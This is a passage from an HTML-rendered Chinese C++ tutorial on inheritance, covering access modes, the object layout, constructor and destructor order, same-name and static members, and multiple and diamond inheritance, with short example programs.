class="line">py.left();</span><br><span class="line">py.content();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//C++页面</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;C++下载视频页面如下： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">CPP cp;</span><br><span class="line">cp.header();</span><br><span class="line">cp.footer();</span><br><span class="line">cp.left();</span><br><span class="line">cp.content();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><p>继承的好处：可以减少重复的代码</p><p>class A : public B;</p><p>A 类称为子类 或 派生类</p><p>B 类称为父类 或 基类</p><p><strong>派生类中的成员，包含两大部分</strong>：</p><p>一类是从基类继承过来的，一类是自己增加的成员。</p><p>从基类继承过过来的表现其共性，而新增的成员体现了其个性。</p><h4 id="4-6-2-继承方式">4.6.2 继承方式</h4><p>继承的语法：<code>class 子类 : 继承方式 父类</code></p><p><strong>继承方式一共有三种：</strong></p><ul><li>公共继承</li><li>保护继承</li><li>私有继承</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">protected:</span><br><span class="line"><span class="type">int</span> m_B;</span><br><span class="line">private:</span><br><span class="line"><span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son1</span> :</span>public Base1</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">m_A; <span class="comment">//可访问 public权限</span></span><br><span class="line">m_B; <span class="comment">//可访问 protected权限</span></span><br><span class="line"><span class="comment">//m_C; //不可访问</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">myClass</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Son1 s1;</span><br><span class="line">s1.m_A; <span class="comment">//其他类只能访问到公共权限</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保护继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base2</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">protected:</span><br><span class="line"><span class="type">int</span> m_B;</span><br><span class="line">private:</span><br><span class="line"><span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son2</span>:</span>protected Base2</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">m_A; <span class="comment">//可访问 protected权限</span></span><br><span class="line">m_B; <span class="comment">//可访问 protected权限</span></span><br><span class="line"><span class="comment">//m_C; //不可访问</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">myClass2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Son2 s;</span><br><span class="line"><span class="comment">//s.m_A; //不可访问</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//私有继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base3</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">protected:</span><br><span class="line"><span class="type">int</span> m_B;</span><br><span class="line">private:</span><br><span class="line"><span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son3</span>:</span>private Base3</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">m_A; <span class="comment">//可访问 private权限</span></span><br><span class="line">m_B; <span class="comment">//可访问 private权限</span></span><br><span class="line"><span class="comment">//m_C; //不可访问</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GrandSon3</span> :</span>public Son3</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//Son3是私有继承，所以继承Son3的属性在GrandSon3中都无法访问到</span></span><br><span class="line"><span class="comment">//m_A;</span></span><br><span class="line"><span class="comment">//m_B;</span></span><br><span class="line"><span class="comment">//m_C;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="4-6-3-继承中的对象模型">4.6.3 继承中的对象模型</h4><p>**问题：**从父类继承过来的成员，哪些属于子类对象中？</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">protected:</span><br><span class="line"><span class="type">int</span> m_B;</span><br><span class="line">private:</span><br><span class="line"><span class="type">int</span> m_C; <span class="comment">//私有成员只是被隐藏了，但是还是会继承下去</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//公共继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span>public Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_D;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sizeof Son = &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(Son) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用工具查看：</p><p>打开工具窗口后，定位到当前 CPP 文件的盘符</p><p>然后输入： cl /d1 reportSingleClassLayout 查看的类名   所属文件名</p><blockquote><p>结论： 父类中私有成员也是被子类继承下去了，只是由编译器给隐藏后访问不到</p></blockquote><h4 id="4-6-4-继承中构造和析构顺序">4.6.4 继承中构造和析构顺序</h4><p>子类继承父类后，当创建子类对象，也会调用父类的构造函数</p><p>问题：父类和子类的构造和析构顺序是谁先谁后？</p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">Base()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">~Base()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base析构函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span> public Base</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">Son()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Son构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">~Son()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Son析构函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</span></span><br><span class="line">Son s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：继承中 先调用父类构造函数，再调用子类构造函数，析构顺序与构造相反</p></blockquote><h4 id="4-6-5-继承同名成员处理方式">4.6.5 继承同名成员处理方式</h4><p>问题：当子类与父类出现同名的成员，如何通过子类对象，访问到子类或父类中同名的数据呢？</p><ul><li>访问子类同名成员   直接访问即可</li><li>访问父类同名成员   需要加作用域</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">Base()</span><br><span class="line">&#123;</span><br><span class="line">m_A = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base - func()调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base - func(int a)调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span> public Base &#123;</span><br><span class="line">public:</span><br><span class="line">Son()</span><br><span class="line">&#123;</span><br><span class="line">m_A = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当子类与父类拥有同名的成员函数，子类会隐藏父类中所有版本的同名成员函数</span></span><br><span class="line"><span class="comment">//如果想访问父类中被隐藏的同名成员函数，需要加父类的作用域</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Son - func()调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Son s;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Son下的m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base下的m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">s.func();</span><br><span class="line">s.Base::func();</span><br><span class="line">s.Base::func(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>子类对象可以直接访问到子类中同名成员</li><li>子类对象加作用域可以访问到父类同名成员</li><li>当子类与父类拥有同名的成员函数，子类会隐藏父类中同名成员函数，加作用域可以访问到父类中同名函数</li></ol><h4 id="4-6-6-继承同名静态成员处理方式">4.6.6 继承同名静态成员处理方式</h4><p>问题：继承中同名的静态成员在子类对象上如何进行访问？</p><p>静态成员和非静态成员出现同名，处理方式一致</p><ul><li>访问子类同名成员   直接访问即可</li><li>访问父类同名成员   需要加作用域</li></ul><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base - static void func()&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base - static void func(int a)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Base::m_A = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span> public Base &#123;</span><br><span class="line">public:</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Son - static void func()&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Son::m_A = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同名成员属性</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//通过对象访问</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;通过对象访问： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Son s;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; s.m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; s.Base::m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过类名访问</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;通过类名访问： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Son  下 m_A = &quot;</span> &lt;&lt; Son::m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base 下 m_A = &quot;</span> &lt;&lt; Son::Base::m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//同名成员函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test02</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//通过对象访问</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;通过对象访问： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Son s;</span><br><span class="line">s.func();</span><br><span class="line">s.Base::func();</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;通过类名访问： &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">Son::func();</span><br><span class="line">Son::Base::func();</span><br><span class="line"><span class="comment">//出现同名，子类会隐藏掉父类中所有同名成员函数，需要加作作用域访问</span></span><br><span class="line">Son::Base::func(<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test01();</span></span><br><span class="line">test02();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：同名静态成员处理方式和非静态处理方式一样，只不过有两种访问的方式（通过对象 和 通过类名）</p></blockquote><h4 id="4-6-7-多继承语法">4.6.7 多继承语法</h4><p>C++允许<strong>一个类继承多个类</strong></p><p>语法：<code>class 子类 ：继承方式 父类1 ， 继承方式 父类2...</code></p><p>多继承可能会引发父类中有同名成员出现，需要加作用域区分</p><p><strong>C++实际开发中不建议用多继承</strong></p><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base1</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">Base1()</span><br><span class="line">&#123;</span><br><span class="line">m_A = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base2</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">Base2()</span><br><span class="line">&#123;</span><br><span class="line">m_A = <span class="number">200</span>;  <span class="comment">//开始是m_B 不会出问题，但是改为mA就会出现不明确</span></span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_A;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//语法：class 子类：继承方式 父类1 ，继承方式 父类2</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span> public Base2, public Base1</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">Son()</span><br><span class="line">&#123;</span><br><span class="line">m_C = <span class="number">300</span>;</span><br><span class="line">m_D = <span class="number">400</span>;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line"><span class="type">int</span> m_C;</span><br><span class="line"><span class="type">int</span> m_D;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//多继承容易产生成员同名的情况</span></span><br><span class="line"><span class="comment">//通过使用类名作用域可以区分调用哪一个基类的成员</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test01</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Son s;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sizeof Son = &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(s) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; s.Base1::m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; s.Base2::m_A &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结： 多继承中如果父类中出现了同名情况，子类使用时候要加作用域</p></blockquote><h4 id="4-6-8-菱形继承">4.6.8 菱形继承</h4><p><strong>菱形继承概念：</strong></p><pre><code>两个派生类继承同一个基类又有某个类同时继承者两个派生类这种继承被称为菱形继承，或者钻石继承</code></pre><p><strong>典型的菱形继承案例：</strong></p><p><strong>菱形继承问题：</strong></p><ol><li></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">羊继承了动物的数据，驼同样继承了动物的数据，当草泥马使用数据时，就会产生二义性。</span><br></pre></td></tr></table></figure><ol start="2"><li>草泥马继承自动物的数据继承了两份，其实我们应该清楚，这份数据我们只需要一份就可以。</li></ol><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 